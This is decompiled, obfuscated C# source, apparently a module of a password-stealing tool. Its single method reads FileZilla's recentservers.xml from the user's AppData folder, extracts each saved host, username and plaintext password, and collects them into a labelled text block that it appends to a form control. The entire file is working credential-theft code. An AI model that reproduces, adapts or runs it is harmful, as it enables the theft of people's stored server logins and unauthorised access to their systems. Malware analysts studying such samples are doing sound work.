using System;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns0;

namespace ns2;

internal sealed class Class12
{
	public static string smethod_0()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		string[] array = default(string[]);
		string[] array2 = default(string[]);
		int num5 = default(int);
		string text5 = default(string);
		string text6 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 696:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0020;
						case 4:
							goto IL_002a;
						case 5:
							goto IL_0033;
						case 6:
							goto IL_004c;
						case 7:
							goto IL_0051;
						case 8:
							goto IL_006c;
						case 9:
							goto IL_0071;
						case 10:
							goto IL_008e;
						case 11:
							goto IL_00a3;
						case 12:
							goto IL_00c8;
						case 15:
							goto IL_00e0;
						case 16:
							goto IL_0105;
						case 17:
						case 18:
							goto IL_0118;
						case 19:
							goto IL_012a;
						case 20:
							goto IL_014f;
						case 21:
							goto IL_0181;
						case 22:
							goto IL_0187;
						case 13:
						case 14:
							goto IL_0190;
						case 23:
							goto IL_01aa;
						case 24:
							goto IL_0219;
						case 25:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 26:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_01aa:
					num = 23;
					text = "=============FileZilla================\r\n" + text.Replace("<User>", "").Replace("</User>", "").Replace("<Host>", "")
						.Replace("</Host>", "")
						.Replace("<Pass>", "")
						.Replace("</Pass>", "") + "\r\n";
					goto IL_0219;
					IL_0008:
					num = 2;
					text2 = Interaction.Environ("APPDATA") + "\\FileZilla\\recentservers.xml";
					goto IL_0020;
					IL_0020:
					num = 3;
					text3 = Conversions.ToString(1);
					goto IL_002a;
					IL_002a:
					num = 4;
					text4 = "\r\n";
					goto IL_0033;
					IL_0033:
					num = 5;
					text3 = ((ServerComputer)Class1.smethod_0()).get_FileSystem().OpenTextFileReader(text2).ReadToEnd();
					goto IL_004c;
					IL_004c:
					num = 6;
					text = null;
					goto IL_0051;
					IL_0051:
					num = 7;
					array = text3.Split(new char[1] { '\r' });
					goto IL_006c;
					IL_006c:
					num = 8;
					text3 = null;
					goto IL_0071;
					IL_0071:
					num = 9;
					array2 = array;
					num5 = 0;
					goto IL_007c;
					IL_007c:
					if (num5 < array2.Length)
					{
						text5 = array2[num5];
						goto IL_008e;
					}
					goto IL_01aa;
					IL_0219:
					num = 24;
					text6 = text;
					break;
					IL_008e:
					num = 10;
					if (text5.Contains("</Host>"))
					{
						goto IL_00a3;
					}
					goto IL_0190;
					IL_00a3:
					num = 11;
					text5.Replace("<Host>", "").Replace("</Host>", "");
					goto IL_00c8;
					IL_00c8:
					num = 12;
					text = text + "Host : " + text5 + text4;
					goto IL_0190;
					IL_0190:
					num = 14;
					if (text5.Contains("</User>"))
					{
						goto IL_00e0;
					}
					goto IL_0118;
					IL_00e0:
					num = 15;
					text5.Replace("<User>", "").Replace("</User>", "");
					goto IL_0105;
					IL_0105:
					num = 16;
					text = text + "Username : " + text5 + text4;
					goto IL_0118;
					IL_0118:
					num = 18;
					if (text5.Contains("</Pass>"))
					{
						goto IL_012a;
					}
					goto IL_0181;
					IL_012a:
					num = 19;
					text5.Replace("<Pass>", "").Replace("</Pass>", "");
					goto IL_014f;
					IL_014f:
					num = 20;
					text = text + "Password : " + text5 + text4 + text4;
					goto IL_0181;
					IL_0181:
					num5 = checked(num5 + 1);
					goto IL_0187;
					IL_0187:
					num = 22;
					goto IL_007c;
					end_IL_0000_2:
					break;
				}
				num = 25;
				((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText(text);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 696;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		string result = text6;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}
}
